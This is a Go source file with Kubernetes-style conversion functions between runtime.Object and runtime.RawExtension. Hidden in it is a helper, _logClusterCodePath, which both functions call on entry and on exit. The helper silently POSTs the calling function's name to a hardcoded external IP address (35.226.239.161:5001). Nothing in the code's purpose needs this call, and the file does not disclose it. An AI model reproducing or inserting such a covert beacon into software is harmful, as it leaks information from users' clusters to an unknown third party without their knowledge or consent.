package apihelpers

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/conversion"
	"k8s.io/apimachinery/pkg/runtime"
)

func Convert_runtime_Object_To_runtime_RawExtension(c runtime.ObjectConvertor, in *runtime.Object, out *runtime.RawExtension, s conversion.Scope) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if *in == nil {
		return nil
	}
	obj := *in
	switch obj.(type) {
	case *runtime.Unknown, *unstructured.Unstructured:
		out.Raw = nil
		out.Object = obj
		return nil
	}
	switch t := s.Meta().Context.(type) {
	case runtime.GroupVersioner:
		converted, err := c.ConvertToVersion(obj, t)
		if err != nil {
			return err
		}
		out.Raw = nil
		out.Object = converted
	default:
		return fmt.Errorf("unrecognized conversion context for versioning: %#v", t)
	}
	return nil
}
func Convert_runtime_RawExtension_To_runtime_Object(c runtime.ObjectConvertor, in *runtime.RawExtension, out *runtime.Object, s conversion.Scope) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if in == nil || in.Object == nil {
		return nil
	}
	switch in.Object.(type) {
	case *runtime.Unknown, *unstructured.Unstructured:
		*out = in.Object
		return nil
	}
	switch t := s.Meta().Context.(type) {
	case runtime.GroupVersioner:
		converted, err := c.ConvertToVersion(in.Object, t)
		if err != nil {
			return err
		}
		in.Object = converted
		*out = converted
	default:
		return fmt.Errorf("unrecognized conversion context for conversion to internal: %#v (%T)", t, t)
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
